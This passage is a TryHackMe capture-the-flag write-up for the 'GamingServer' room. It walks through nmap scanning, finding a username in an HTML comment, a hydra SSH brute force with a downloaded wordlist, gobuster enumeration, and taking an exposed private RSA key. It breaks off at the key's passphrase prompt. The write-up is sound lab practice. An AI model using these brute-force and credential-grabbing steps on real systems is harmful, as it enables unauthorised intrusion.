# THM: GamingServer

| Stat | Value |
| ---------- | -------------------------------------------- |
| Image | <img src="../../images/write_ups/try_hack_me/gaming_server/gaming_server.jpeg" alt="GamingServer" width="90"/> |
| Room | GamingServer |
| URL | [https://tryhackme.com/room/cowboyhacker](https://tryhackme.com/room/gamingserver) |
| Difficulty | Easy |

## Concepts/Tools Used

- [gobuster](../../tools/gobuster.md)
- [hydra](../../tools/hydra.md)
- wget
- [john](../../tools/john.md)
- lxd

## Room Description

An Easy Boot2Root box for beginners.

## Process

Once the machine starts up I save the machine's ip address to my host file so that I can type `target.thm` instead of an ip address.

I run nmap to see what ports are open:
```bash
$ nmap -T4 -n -sC -sV -Pn -v -p- target.thm
Starting Nmap 7.80 ( https://nmap.org ) at 2025-06-25 14:28 BST
NSE: Loaded 151 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 14:29
Completed NSE at 14:29, 0.00s elapsed
Initiating NSE at 14:29
Completed NSE at 14:29, 0.00s elapsed
Initiating NSE at 14:29
Completed NSE at 14:29, 0.00s elapsed
Initiating ARP Ping Scan at 14:29
Scanning target.thm (10.10.29.122) [1 port]
Completed ARP Ping Scan at 14:29, 0.03s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 14:29
Scanning target.thm (10.10.29.122) [65535 ports]
Discovered open port 80/tcp on 10.10.29.122
Discovered open port 22/tcp on 10.10.29.122
Completed SYN Stealth Scan at 14:29, 1.28s elapsed (65535 total ports)
Initiating Service scan at 14:29
Scanning 2 services on target.thm (10.10.29.122)
Completed Service scan at 14:29, 6.02s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.29.122.
Initiating NSE at 14:29
Completed NSE at 14:29, 0.27s elapsed
Initiating NSE at 14:29
Completed NSE at 14:29, 0.01s elapsed
Initiating NSE at 14:29
Completed NSE at 14:29, 0.00s elapsed
Nmap scan report for target.thm (10.10.29.122)
Host is up (0.00019s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 34:0e:fe:06:12:67:3e:a4:eb:ab:7a:c4:81:6d:fe:a9 (RSA)
|   256 49:61:1e:f4:52:6e:7b:29:98:db:30:2d:16:ed:f4:8b (ECDSA)
|_  256 b8:60:c4:5b:b7:b2:d0:23:a0:c7:56:59:5c:63:1e:c4 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-methods:
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: House of danak
MAC Address: 02:18:00:64:DD:0F (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
Initiating NSE at 14:29
Completed NSE at 14:29, 0.00s elapsed
Initiating NSE at 14:29
Completed NSE at 14:29, 0.00s elapsed
Initiating NSE at 14:29
Completed NSE at 14:29, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.35 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)
```

SSH allows password login attempts. I start to check the site on port 80.

Inspecting http://target.thm/ has an interesting comment in html:
<!-- john, please add some actual content to the site! lorem ipsum is horrible to look at. -->

It looks like I found a username. I check the robots.txt file and it shows the following:

```bash
user-agent: *
Allow: /
/uploads/
```

The uploads directory has a dictionary file dict.lst, I download it using the following command:

```bash
$ wget http://target.thm/dict.lst
```

Since I have a username and a dictionary, I try both on the ssh service for this machine using hydra. Here is the command I ran:

```bash
$ hydra -l john -P dict.lst target.thm ssh
```

That yield nothing.

I ran gobuster to find more directories on the server. Here is the command I ran:

```bash
$ gobuster dir -u http://target.thm -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://target.thm
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/uploads              (Status: 301) [Size: 310] [--> http://target.thm/uploads/]
/secret               (Status: 301) [Size: 309]
```

The /secret directory has a single file called secretKey. It is a private rsa key. I download it using the following command:

```bash
$ wget http://target.thm/secret/secretKey
```

Since this is a private rsa key I change the permission to private read/write so I won't get a warning each time I use this. Here is the command I used to fix the permissions:

```bash
$ chmod 600 secretKey
```

I try to ssh into the machine with this key but it wants a passphrase for the key. Here is what I used to ssh with the key:

```bash
$ ssh john@target.thm -i secretKey
```
